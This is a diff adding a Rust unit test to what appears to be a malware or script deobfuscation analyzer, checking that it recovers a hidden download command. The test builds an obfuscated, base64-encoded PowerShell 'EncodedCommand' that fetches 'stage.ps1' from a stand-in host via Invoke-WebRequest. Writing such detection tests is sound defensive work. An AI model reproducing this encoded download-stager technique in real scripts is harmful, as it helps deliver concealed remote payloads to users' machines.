@@ -15444,6 +15444,37 @@ Clean '{obfuscated}' '~' ''"#
     }
 
     #[test]
+    fn ps1_literal_split_index_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value,$sep,$index) {{
+  return $value.Split($sep)[$index]
+}}
+Piece 'noise|{decoded}|tail' '|' 1"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-split-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal split-index extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_hex_split_char_loop() {
         let ps = r#"$h = '40 65 63 68 6f 20 6f 66 66 0d 0a 65 63 68 6f 20 68 69' -Split ' ' | foreach {[char]([convert]::toint16($_,16))}; $s = $h -join ''"#;
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
